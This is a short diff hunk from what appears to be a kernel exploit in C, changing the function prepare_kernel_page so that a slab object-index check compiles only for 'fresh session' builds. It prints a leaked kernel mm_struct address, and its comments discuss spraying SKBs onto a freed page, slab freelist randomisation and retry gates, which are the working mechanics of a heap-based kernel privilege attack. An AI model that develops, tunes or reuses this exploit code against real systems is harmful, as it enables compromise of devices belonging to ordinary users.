@@ -2261,13 +2261,14 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
           leaked, base, (leaked - base) / MM_STRUCT_SZ);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
-    defined(APP_SLIDE_MIN_OBJECT_INDEX)
+    defined(APP_SLIDE_MIN_OBJECT_INDEX) && \
+    defined(APP_REQUIRE_FRESH_P0_SESSION)
   /*
-   * Campaign 20: the non-fresh path previously accepted every index.  PR
-   * #303's device-validated UEDZE4 partition starts at 27; index 22 means
-   * the slab was not fully reclaimed/returned, so the SKB spray cannot land
-   * on the freed page (analysis gatemiss §3).  Returning 0 makes
-   * prepare_good_kernel_page() take a fresh mm page.
+   * Campaign 20 (objindex findings §3): retained only for fresh-session
+   * builds.  PR #303's 27..30 is their KernelSnitch search window, not a
+   * non-fresh validity rule; SLAB_FREELIST_RANDOM places the leaked mm at
+   * any slot, so the post-write gate readback + retries decide.  Without
+   * APP_REQUIRE_FRESH_P0_SESSION this block compiles out.
    */
   size_t slide_object_index = (leaked - base) / MM_STRUCT_SZ;
   if (payload_mode == PAGE_PAYLOAD_SLIDE &&
